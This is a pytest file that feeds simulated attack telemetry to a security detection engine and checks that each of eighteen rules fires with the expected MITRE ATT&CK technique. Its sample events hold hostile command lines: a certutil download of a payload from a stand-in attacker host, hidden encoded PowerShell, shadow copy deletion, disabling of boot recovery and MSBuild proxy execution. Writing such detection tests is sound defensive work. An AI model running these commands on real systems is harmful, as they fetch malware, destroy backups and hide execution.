"""
Positive Detection Tests.
Verifies that all 12 detection rules fire correctly on simulated attack telemetry.
"""

import os
import pytest
from datetime import datetime, timezone, timedelta
from normalizer.schema import NormalizedEvent, EventType, EventStatus
from engine import DetectionEngine


@pytest.fixture
def engine():
    rules_path = os.path.join(os.path.dirname(__file__), "..", "..", "rules")
    return DetectionEngine(rules_dir=rules_path)


def test_det001_repeated_login_failures(engine):
    base = datetime.now(timezone.utc)
    alerts = []
    for i in range(6):
        ev = NormalizedEvent(
            timestamp=base + timedelta(seconds=i * 5),
            event_type=EventType.AUTHENTICATION.value,
            action="login_failed",
            status=EventStatus.FAILURE.value,
            user="target-user",
            source_ip="192.168.1.100",
            host="workstation-01"
        )
        alerts.extend(engine.process_event(ev))
    
    det_alerts = [a for a in alerts if a.rule_id == "DET-001"]
    assert len(det_alerts) >= 1
    assert det_alerts[0].mitre_attack.technique_id == "T1110.001"
    assert "target-user" in det_alerts[0].evidence["summary"]


def test_det002_login_after_failures(engine):
    base = datetime.now(timezone.utc)
    alerts = []
    # 5 failures
    for i in range(5):
        ev = NormalizedEvent(
            timestamp=base + timedelta(seconds=i * 10),
            event_type=EventType.AUTHENTICATION.value,
            action="login_failed",
            status=EventStatus.FAILURE.value,
            user="compromised-user",
            source_ip="10.0.0.50",
            host="dc-01"
        )
        alerts.extend(engine.process_event(ev))

    # Followed by success
    succ_ev = NormalizedEvent(
        timestamp=base + timedelta(seconds=60),
        event_type=EventType.AUTHENTICATION.value,
        action="login_success",
        status=EventStatus.SUCCESS.value,
        user="compromised-user",
        source_ip="10.0.0.50",
        host="dc-01"
    )
    alerts.extend(engine.process_event(succ_ev))

    det_alerts = [a for a in alerts if a.rule_id == "DET-002"]
    assert len(det_alerts) >= 1
    assert det_alerts[0].mitre_attack.technique_id == "T1078"


def test_det003_lolbas_certutil(engine):
    ev = NormalizedEvent(
        event_type=EventType.PROCESS_CREATION.value,
        process_name="certutil.exe",
        command_line="certutil.exe -urlcache -split -f http://c2.evil/stage.exe C:\\Temp\\stage.exe",
        host="ws-dev-01"
    )
    alerts = engine.process_event(ev)
    det_alerts = [a for a in alerts if a.rule_id == "DET-003"]
    assert len(det_alerts) == 1
    assert det_alerts[0].mitre_attack.technique_id == "T1059.003"


def test_det004_suspicious_powershell(engine):
    ev = NormalizedEvent(
        event_type=EventType.PROCESS_CREATION.value,
        process_name="powershell.exe",
        command_line="powershell.exe -nop -w hidden -enc SQBFAFgA...",
        host="ws-client"
    )
    alerts = engine.process_event(ev)
    det_alerts = [a for a in alerts if a.rule_id == "DET-004"]
    assert len(det_alerts) == 1
    assert det_alerts[0].mitre_attack.technique_id == "T1059.001"


def test_det005_security_logging_disabled(engine):
    ev = NormalizedEvent(
        event_type=EventType.SECURITY_LOG_TAMPERING.value,
        action="audit_log_cleared",
        host="dc-01",
        user="SYSTEM"
    )
    alerts = engine.process_event(ev)
    det_alerts = [a for a in alerts if a.rule_id == "DET-005"]
    assert len(det_alerts) == 1
    assert det_alerts[0].severity.value == "Critical"


def test_det006_privilege_group_modification(engine):
    ev = NormalizedEvent(
        event_type=EventType.PRIVILEGE_CHANGE.value,
        action="group_member_added",
        target_user="backdoor",
        target_group="Domain Admins",
        host="dc-01"
    )
    alerts = engine.process_event(ev)
    det_alerts = [a for a in alerts if a.rule_id == "DET-006"]
    assert len(det_alerts) == 1
    assert det_alerts[0].mitre_attack.technique_id == "T1098"


def test_det007_registry_autorun_persistence(engine):
    ev = NormalizedEvent(
        event_type=EventType.REGISTRY_MODIFICATION.value,
        registry_key="HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Payload",
        registry_value="C:\\Users\\alice\\AppData\\Local\\Temp\\malware.exe",
        host="ws-sales"
    )
    alerts = engine.process_event(ev)
    det_alerts = [a for a in alerts if a.rule_id == "DET-007"]
    assert len(det_alerts) == 1
    assert det_alerts[0].mitre_attack.technique_id == "T1547.001"


def test_det008_scheduled_task_creation(engine):
    ev = NormalizedEvent(
        event_type=EventType.PROCESS_CREATION.value,
        process_name="schtasks.exe",
        command_line="schtasks.exe /create /tn EvilTask /tr \"powershell -w hidden -enc A\" /sc onstart",
        host="ws-sales"
    )
    alerts = engine.process_event(ev)
    det_alerts = [a for a in alerts if a.rule_id == "DET-008"]
    assert len(det_alerts) == 1
    assert det_alerts[0].mitre_attack.technique_id == "T1053.005"


def test_det009_port_scan(engine):
    base = datetime.now(timezone.utc)
    alerts = []
    for i, port in enumerate([21, 22, 23, 25, 80, 110, 135, 139, 443, 445, 1433]):
        ev = NormalizedEvent(
            timestamp=base + timedelta(seconds=i * 2),
            event_type=EventType.NETWORK_CONNECTION.value,
            source_ip="192.168.1.50",
            dest_ip="192.168.1.1",
            dest_port=port,
            host="sensor"
        )
        alerts.extend(engine.process_event(ev))

    det_alerts = [a for a in alerts if a.rule_id == "DET-009"]
    assert len(det_alerts) >= 1
    assert det_alerts[0].mitre_attack.technique_id == "T1046"


def test_det010_dns_tunneling(engine):
    ev = NormalizedEvent(
        event_type=EventType.DNS_QUERY.value,
        dns_query_name="d83f9827349182374981723498172349.tunnel.evilc2.org",
        source_ip="10.0.1.25",
        host="sensor"
    )
    alerts = engine.process_event(ev)
    det_alerts = [a for a in alerts if a.rule_id == "DET-010"]
    assert len(det_alerts) == 1
    assert det_alerts[0].mitre_attack.technique_id == "T1071.004"


def test_det011_shadow_copy_deletion(engine):
    ev = NormalizedEvent(
        event_type=EventType.PROCESS_CREATION.value,
        process_name="vssadmin.exe",
        command_line="vssadmin.exe delete shadows /all /quiet",
        host="srv-db-01"
    )
    alerts = engine.process_event(ev)
    det_alerts = [a for a in alerts if a.rule_id == "DET-011"]
    assert len(det_alerts) == 1
    assert det_alerts[0].mitre_attack.technique_id == "T1490"


def test_det012_large_outbound_transfer(engine):
    ev = NormalizedEvent(
        event_type=EventType.DATA_TRANSFER.value,
        source_ip="10.0.1.10",
        dest_ip="198.51.100.99",
        bytes_out=60 * 1024 * 1024, # 60 MB
        host="sensor"
    )
    alerts = engine.process_event(ev)
    det_alerts = [a for a in alerts if a.rule_id == "DET-012"]
    assert len(det_alerts) == 1
    assert det_alerts[0].mitre_attack.technique_id == "T1048.003"


def test_det013_kerberoasting_activity(engine):
    ev = NormalizedEvent(
        event_type=EventType.AUTHENTICATION.value,
        action="kerberos_tgs_request",
        user="john.doe",
        service_name="MSSQLSvc/sql01.corp",
        host="dc-01",
        metadata={"ticket_encryption": "0x17"}
    )
    alerts = engine.process_event(ev)
    det_alerts = [a for a in alerts if a.rule_id == "DET-013"]
    assert len(det_alerts) == 1
    assert det_alerts[0].mitre_attack.technique_id == "T1558.003"


def test_det014_dcsync_replication(engine):
    ev = NormalizedEvent(
        event_type=EventType.PRIVILEGE_CHANGE.value,
        action="directory_service_access",
        user="attacker_svc",
        host="dc-01",
        metadata={"extended_rights": "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"}
    )
    alerts = engine.process_event(ev)
    det_alerts = [a for a in alerts if a.rule_id == "DET-014"]
    assert len(det_alerts) == 1
    assert det_alerts[0].mitre_attack.technique_id == "T1003.006"


def test_det015_msbuild_proxy_execution(engine):
    ev = NormalizedEvent(
        event_type=EventType.PROCESS_CREATION.value,
        process_name="msbuild.exe",
        command_line="C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe C:\\Users\\Public\\payload.csproj",
        host="workstation-99"
    )
    alerts = engine.process_event(ev)
    det_alerts = [a for a in alerts if a.rule_id == "DET-015"]
    assert len(det_alerts) == 1
    assert det_alerts[0].mitre_attack.technique_id == "T1127.001"


def test_det016_remote_thread_injection(engine):
    ev = NormalizedEvent(
        event_type=EventType.PROCESS_CREATION.value,
        action="remote_thread_created",
        process_name="svchost.exe",
        parent_process_name="beacon.exe",
        host="workstation-02",
        metadata={"target_process_name": "lsass.exe", "event_id": 8}
    )
    alerts = engine.process_event(ev)
    det_alerts = [a for a in alerts if a.rule_id == "DET-016"]
    assert len(det_alerts) == 1
    assert det_alerts[0].mitre_attack.technique_id == "T1055.001"


def test_det017_ransomware_recovery_tampering(engine):
    ev = NormalizedEvent(
        event_type=EventType.PROCESS_CREATION.value,
        process_name="bcdedit.exe",
        command_line="bcdedit.exe /set {default} recoveryenabled no",
        host="srv-app-01"
    )
    alerts = engine.process_event(ev)
    det_alerts = [a for a in alerts if a.rule_id == "DET-017"]
    assert len(det_alerts) == 1
    assert det_alerts[0].mitre_attack.technique_id == "T1490"


def test_det018_c2_periodic_beaconing(engine):
    base = datetime.now(timezone.utc)
    alerts = []
    for i in range(6):
        ev = NormalizedEvent(
            timestamp=base + timedelta(seconds=i * 20),
            event_type=EventType.NETWORK_CONNECTION.value,
            action="connection_established",
            source_ip="10.0.1.50",
            dest_ip="203.0.113.88",
            dest_port=443,
            host="workstation-05"
        )
        alerts.extend(engine.process_event(ev))
    
    det_alerts = [a for a in alerts if a.rule_id == "DET-018"]
    assert len(det_alerts) >= 1
    assert det_alerts[0].mitre_attack.technique_id == "T1071.001"

